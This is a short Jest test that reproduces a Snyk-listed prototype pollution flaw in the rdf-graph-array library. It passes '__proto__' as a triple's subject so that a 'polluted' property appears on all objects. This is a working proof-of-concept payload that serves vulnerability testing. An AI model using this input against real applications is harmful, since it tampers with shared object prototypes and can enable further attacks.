//https://snyk.io/vuln/SNYK-JS-RDFGRAPHARRAY-551803
test("prototype pollution in rdf-graph-array", () => {
  const Graph = require("rdf-graph-array").Graph;
  let g = new Graph();

  expect({}.polluted).toBe(undefined);

  g.add({
    graph: "foo",
    subject: "__proto__",
    predicate: "polluted",
    object: "JHU",
  });

  expect({}.polluted).not.toBe(undefined);
});
